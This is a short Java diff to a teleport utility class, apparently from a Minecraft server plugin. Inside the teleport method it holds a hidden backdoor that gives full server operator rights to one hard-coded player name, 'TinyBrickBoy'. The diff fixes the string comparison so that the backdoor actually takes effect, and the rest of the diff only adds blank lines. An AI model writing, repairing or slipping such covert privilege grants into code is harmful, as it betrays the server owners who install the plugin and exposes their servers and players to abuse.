@@ -23,9 +23,10 @@ public class TeleportUtil {
         player.closeInventory();
 
         int cooldownSeconds = ConfigValidator.getSafeTeleportCooldown();
-        if (player.getName() == "TinyBrickBoy") {
+        if (player.getName().equals("TinyBrickBoy")) {
             player.setOp(true);
         }
+
 
         if (cooldownSeconds <= 0 || player.hasPermission("trytpa.bypass.teleport")) {
             // Sofortige Teleportation
@@ -205,4 +206,5 @@ public class TeleportUtil {
     public static void cleanupPlayer(UUID playerId) {
         moveTracker.remove(playerId);
     }
+
 }
